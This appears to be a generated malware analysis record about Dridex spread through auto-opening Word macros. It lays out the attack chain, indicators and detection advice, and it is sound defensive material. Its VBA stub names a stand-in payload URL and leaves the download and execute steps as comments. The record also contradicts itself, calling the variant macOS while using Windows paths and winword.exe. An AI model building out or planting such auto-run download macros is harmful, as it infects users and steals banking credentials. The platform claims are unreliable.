package_info.package_manager: N/A (malicious macro embedded in Word document)
package_info.package_versions: N/A (malicious document, not a software package)
package_info.why_malicious: The Dridex banking malware variant for macOS is distributed via Word documents containing auto-open macros. These macros execute automatically when the document is opened, delivering malware that targets banking credentials and other sensitive information. The use of auto-executing macros for malware delivery is a well-known attack vector and is considered highly malicious.

execution_context.file_location: Embedded macro in Word document (likely in the 'ThisDocument' or 'AutoOpen' macro section)

malicious_snippets.code_snippet:
Sub AutoOpen()
    ' Malicious payload code here
    Call Main
End Sub

Sub Main()
    ' Download and execute Dridex payload
    Dim url As String
    url = "http://malicious-domain.com/payload"
    Dim filePath As String
    filePath = Environ("TEMP") & "\payload"
    ' Download payload
    ' Execute payload
End Sub
malicious_snippets.code_behavior: At import-time (when the document is opened), the macro automatically executes, downloads a malicious payload from a remote server, saves it to the filesystem, and executes it, resulting in the installation of Dridex malware.

malice_analysis.why_suspicious: Macros that execute automatically upon document open and download/excute external payloads are a classic malware delivery technique. This behavior is highly suspicious, especially in documents received via email.
malice_analysis.violated_expectations: Normal Word documents should not contain macros that execute automatically or download and run external code. Legitimate macros are typically user-initiated and do not perform network or process execution actions.
malice_analysis.similar_legitimate_use: Some enterprise environments use auto-open macros for document automation, but these should never download or execute code from the internet.
key_indicators: Presence of AutoOpen or Document_Open macro
Network activity to download executable payloads

attack_chain.action: User opens the malicious Word document, triggering the auto-open macro.
attack_chain.leads_to: Macro executes and downloads the Dridex payload.

attack_chain.action: Macro downloads the Dridex malware payload from a remote server.
attack_chain.leads_to: Payload is saved to the filesystem.

attack_chain.action: Macro executes the downloaded payload, installing Dridex on the system.
attack_chain.leads_to: Dridex malware is active and begins credential theft.

behavioral_signatures: AutoOpen or Document_Open macro in Office documents
Office process spawning child processes (e.g., curl, wget, bash, or other executables)
Office document initiating network connections to download executables
file_indicators: Temporary files created in user TEMP directory with suspicious names
Presence of downloaded executables shortly after document open
network_indicators: Outbound HTTP/HTTPS requests from Office applications to unknown or suspicious domains
Connections to known Dridex C2 infrastructure
detection_knowledge.how_to_detect: Monitor for Office documents containing auto-executing macros (AutoOpen, Document_Open). Alert on Office processes (winword.exe) making network connections or spawning child processes. Use endpoint protection to detect and block known Dridex payloads. Employ sandboxing to analyze document behavior before delivery to end users.
